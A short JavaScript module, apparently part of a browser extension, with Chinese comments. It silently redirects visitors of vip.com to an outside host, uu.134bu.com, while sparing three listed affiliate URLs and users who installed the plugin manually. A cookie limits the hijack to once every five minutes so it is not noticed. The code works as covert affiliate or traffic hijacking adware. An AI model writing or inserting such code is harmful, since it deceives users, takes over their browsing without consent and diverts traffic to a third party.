__tk__define(function (require, exports, module) {
	var utils = require('../utils');

	// 自主安装渠道的插件不弹
	if (utils.isManualDId) {
		return;
	}
	var url = utils.href,
	// 当前url是否是已跳转url
		isJumpedUrl = function() {
			// 以下链接不跳转
			var i, iLen,
			// 从2345首页跳转过来的vip链接不跳转
				blackList = [
					'http://www.vip.com/?tn=91529317_hao_pg',
					'http://www.vip.com/?tn=95895567_hao_pg',
					'http://www.vip.com/?tn=97975504_hao_pg'
				];

			for (i = 0, iLen = blackList.length; i < iLen; i++) {
				if (url === blackList[i]) {
					return false;
				}
			}
			if (url.match(/^http:\/\/www\.vip\.com\/\?.*/)) {
				return true;
			}
			return false;
		},
	// url跳转函数
		urlJump = function() {
			document.location.href = 'http://uu.134bu.com/vp/a/';
		};

	// 以下两种情况下允许vip跳转
	// 2.访问跳转后的链接，并且cookie不存在的情况
	if ((isJumpedUrl() && !utils.cookie.get().vipTK) || (url === 'http://www.vip.com/' && !utils.cookie.get().vipTK)) {
		// 写入cookie, 通过cookie控制每隔一段时间跳转（防止死循环）
		utils.cookie.set({
			name: 'vipTK',
			value: true,
			min: 5,
			path: '/',
			domain: 'vip.com'
		});
		// cookie写入失败的场合（例如设置浏览器禁止写入cookie）不跳转链接
		if (utils.cookie.get().vipTK) {
			urlJump();
		}
	}
});
